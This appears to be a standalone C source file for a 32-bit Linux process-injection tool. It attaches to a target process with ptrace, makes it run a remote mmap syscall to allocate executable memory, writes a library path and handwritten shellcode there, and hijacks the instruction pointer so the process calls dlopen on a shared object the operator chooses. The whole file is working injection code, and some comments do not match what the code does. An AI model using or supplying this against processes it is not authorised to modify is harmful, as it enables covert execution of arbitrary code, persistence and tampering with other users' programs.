#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <elf.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>

/*
 * Alternative approach: Write shellcode to an executable region.
 * We'll find a code cave in libc or the binary itself, or use
 * the fact that we can call syscalls directly with ptrace.
 * 
 * Strategy: Use PTRACE_SYSCALL to make the target execute syscalls
 * for us, specifically mmap to allocate executable memory, then
 * execute our payload there.
 */

unsigned long find_library_base(pid_t pid, const char* library) {
    char maps_path[256];
    char line[512];
    unsigned long addr = 0;
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    FILE* maps = fopen(maps_path, "r");
    if (!maps) return 0;
    
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, library) && strstr(line, " 00000000 ")) {
            sscanf(line, "%lx-", &addr);
            break;
        }
    }
    fclose(maps);
    return addr;
}

unsigned long find_symbol_offset(const char* library_path, const char* symbol) {
    int fd = open(library_path, O_RDONLY);
    if (fd < 0) return 0;
    
    Elf32_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
        close(fd);
        return 0;
    }
    
    Elf32_Shdr* shdrs = malloc(ehdr.e_shnum * sizeof(Elf32_Shdr));
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    read(fd, shdrs, ehdr.e_shnum * sizeof(Elf32_Shdr));
    
    Elf32_Shdr* dynsym = NULL;
    Elf32_Shdr* dynstr = NULL;
    
    for (int i = 0; i < ehdr.e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_DYNSYM) {
            dynsym = &shdrs[i];
            dynstr = &shdrs[dynsym->sh_link];
            break;
        }
    }
    
    if (!dynsym || !dynstr) {
        free(shdrs);
        close(fd);
        return 0;
    }
    
    char* strtab = malloc(dynstr->sh_size);
    lseek(fd, dynstr->sh_offset, SEEK_SET);
    read(fd, strtab, dynstr->sh_size);
    
    int num_syms = dynsym->sh_size / sizeof(Elf32_Sym);
    Elf32_Sym* syms = malloc(dynsym->sh_size);
    lseek(fd, dynsym->sh_offset, SEEK_SET);
    read(fd, syms, dynsym->sh_size);
    
    unsigned long offset = 0;
    for (int i = 0; i < num_syms; i++) {
        char* name = strtab + syms[i].st_name;
        if (strcmp(name, symbol) == 0 && syms[i].st_value != 0) {
            offset = syms[i].st_value;
            // Don't break, prefer later (versioned) symbols
        }
    }
    
    free(syms);
    free(strtab);
    free(shdrs);
    close(fd);
    return offset;
}

int write_memory(pid_t pid, unsigned long addr, void* buffer, size_t len) {
    long* src = (long*)buffer;
    size_t words = (len + sizeof(long) - 1) / sizeof(long);
    
    for (size_t i = 0; i < words; i++) {
        if (ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), src[i]) == -1) {
            perror("PTRACE_POKEDATA");
            return -1;
        }
    }
    return 0;
}

int read_memory(pid_t pid, unsigned long addr, void* buffer, size_t len) {
    long* dst = (long*)buffer;
    size_t words = (len + sizeof(long) - 1) / sizeof(long);
    
    for (size_t i = 0; i < words; i++) {
        errno = 0;
        dst[i] = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
        if (errno != 0) return -1;
    }
    return 0;
}

// Execute a syscall in the target process
long remote_syscall(pid_t pid, long syscall_num, 
                    long arg1, long arg2, long arg3, 
                    long arg4, long arg5, long arg6) {
    struct user_regs_struct regs, orig_regs;
    
    ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs);
    regs = orig_regs;
    
    // Set up syscall (32-bit: eax=syscall#, ebx/ecx/edx/esi/edi/ebp=args)
    regs.eax = syscall_num;
    regs.ebx = arg1;
    regs.ecx = arg2;
    regs.edx = arg3;
    regs.esi = arg4;
    regs.edi = arg5;
    regs.ebp = arg6;
    
    // Find syscall instruction in memory (we'll use one from libc)
    // Actually, we need to find a "int 0x80" or "sysenter" gadget
    // For simplicity, let's write our own tiny shellcode
    
    // Backup 2 bytes at current EIP
    long orig_code = ptrace(PTRACE_PEEKDATA, pid, orig_regs.eip, NULL);
    
    // Write "int 0x80; int3" (CD 80 CC)
    long new_code = (orig_code & 0xFF000000) | 0x00CC80CD;
    ptrace(PTRACE_POKEDATA, pid, orig_regs.eip, new_code);
    
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    int status;
    waitpid(pid, &status, 0);
    
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    long result = regs.eax;
    
    // Restore
    ptrace(PTRACE_POKEDATA, pid, orig_regs.eip, orig_code);
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    
    return result;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <pid> <path_to_so>\n", argv[0]);
        return 1;
    }
    
    pid_t pid = atoi(argv[1]);
    char* so_path = realpath(argv[2], NULL);
    
    if (!so_path) {
        perror("realpath");
        return 1;
    }
    
    printf("[*] Target PID: %d\n", pid);
    printf("[*] Library: %s\n", so_path);
    
    // Attach
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("PTRACE_ATTACH");
        free(so_path);
        return 1;
    }
    waitpid(pid, NULL, 0);
    printf("[+] Attached\n");
    
    // Get libc info
    unsigned long libc_base = find_library_base(pid, "libc");
    if (!libc_base) {
        printf("[-] Could not find libc\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    printf("[+] libc base: 0x%lx\n", libc_base);
    
    char libc_path[256] = "/usr/lib/i386-linux-gnu/libc.so.6";
    
    unsigned long dlopen_offset = find_symbol_offset(libc_path, "dlopen");
    unsigned long dlopen_addr = libc_base + dlopen_offset;
    printf("[+] dlopen: 0x%lx\n", dlopen_addr);
    
    // Step 1: Allocate executable memory using mmap syscall
    // mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    printf("[*] Allocating executable memory...\n");
    long exec_mem = remote_syscall(pid, SYS_mmap2,
        0,                          // addr (NULL)
        4096,                       // length
        PROT_READ|PROT_WRITE|PROT_EXEC, // prot
        MAP_PRIVATE|MAP_ANONYMOUS,  // flags
        -1,                         // fd
        0);                         // offset
    
    if (exec_mem < 0 || exec_mem == (long)-1) {
        printf("[-] mmap failed: %ld\n", exec_mem);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    printf("[+] Allocated executable memory at: 0x%lx\n", exec_mem);
    
    // Step 2: Write library path to executable memory
    size_t path_len = strlen(so_path) + 1;
    unsigned long path_addr = exec_mem + 256;  // Path at offset 256
    write_memory(pid, path_addr, so_path, path_len);
    printf("[+] Wrote path at: 0x%lx\n", path_addr);
    
    // Step 3: Write shellcode to executable memory
    // Shellcode: push RTLD_NOW, push path_addr, call dlopen, add esp 8, int3
    unsigned char shellcode[] = {
        // push RTLD_NOW (2)  
        0x68, 0x02, 0x00, 0x00, 0x00,
        // push path_addr (patched below)
        0x68, 0x00, 0x00, 0x00, 0x00,
        // mov eax, dlopen_addr (patched below)
        0xb8, 0x00, 0x00, 0x00, 0x00,
        // call eax
        0xff, 0xd0,
        // add esp, 8
        0x83, 0xc4, 0x08,
        // int3
        0xcc
    };
    
    *(unsigned long*)(shellcode + 6) = path_addr;
    *(unsigned long*)(shellcode + 11) = dlopen_addr;
    
    write_memory(pid, exec_mem, shellcode, sizeof(shellcode));
    printf("[+] Wrote shellcode at: 0x%lx\n", exec_mem);
    
    // Step 4: Save registers and jump to shellcode
    struct user_regs_struct regs, orig_regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs);
    regs = orig_regs;
    regs.eip = exec_mem;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    
    printf("[*] Executing shellcode...\n");
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    int status;
    waitpid(pid, &status, 0);
    
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        if (regs.eax != 0) {
            printf("[+] SUCCESS! Library loaded, handle: 0x%lx\n", (unsigned long)regs.eax);
        } else {
            printf("[-] dlopen returned NULL\n");
        }
    } else {
        printf("[-] Stopped with signal: %d\n", WSTOPSIG(status));
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        printf("[-] EIP: 0x%lx\n", (unsigned long)regs.eip);
    }
    
    // Restore and cleanup
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    
    // Optionally munmap the allocated memory
    remote_syscall(pid, SYS_munmap, exec_mem, 4096, 0, 0, 0, 0);
    
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    printf("[+] Detached\n");
    
    free(so_path);
    return 0;
}
